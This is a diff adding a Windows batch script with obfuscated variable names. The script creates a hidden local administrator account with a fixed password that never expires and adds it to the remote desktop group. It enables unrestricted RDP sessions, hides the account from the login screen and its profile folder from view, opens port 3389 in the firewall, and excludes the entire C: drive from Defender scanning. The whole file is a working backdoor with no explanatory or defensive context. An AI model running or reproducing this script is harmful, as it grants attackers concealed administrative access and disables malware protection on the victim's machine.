@@ -1,0 +1,40 @@
+@echo off
+
+set usgfdger=defaultuserx
+set paladiums=StffXruf3331
+
+set ASTALIND=S-1-5-32-544
+set AdqoiHFHHoup=
+For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%ASTALIND%'" Get Name /Value ^| Find "="`) Do set AdqoiHFHHoup=%%J
+set AdqoiHFHHoup=%AdqoiHFHHoup:~0,-1%
+net user %usgfdger% %paladiums% /add /active:"yes" /expires:"never" /passwordchg:"NO"
+net localgroup %AdqoiHFHHoup% %usgfdger% /add
+set RdfffffffID=S-1-5-32-555
+set RDdddPfffffffffup=
+For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%RdfffffffID%'" Get Name /Value ^| Find "="`) Do set RDdddPfffffffffup=%%J
+set RDdddPfffffffffup=%RDdddPfffffffffup:~0,-1%
+net localgroup "%RDdddPfffffffffup%" %usgfdger% /add
+net accounts /forcelogoff:no /maxpwage:unlimited
+
+reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
+reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "AllowMultipleTSSessions" /t REG_DWORD /d 0x1 /f
+reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
+reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\Licensing Core" /v "EnableConcurrentSessions" /t REG_DWORD /d 0x0 /f
+reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "fSingleSessionPerUser" /t REG_DWORD /d 0x0 /f
+reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxConnectionTime" /t REG_DWORD /d 0x0 /f
+reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxIdleTime" /t REG_DWORD /d 0x0 /f
+reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "PortNumber" /t REG_DWORD /d 0xd3d /f
+reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %usgfdger% /t REG_DWORD /d 0x0 /f
+
+if not exist %systemdrive%\users\%usgfdger% mkdir %systemdrive%\users\%usgfdger% & attrib %systemdrive%\users\%usgfdger% +r +a +s +h
+
+netsh advfirewall firewall del rule="Remote Desktop"
+
+netsh advfirewall firewall add rule name="Remote Desktop" dir=in protocol=tcp localport=3389 action=allow
+
+
+powershell.exe -Command "Add-MpPreference -ExclusionPath 'C:\'"
+
+
+
+
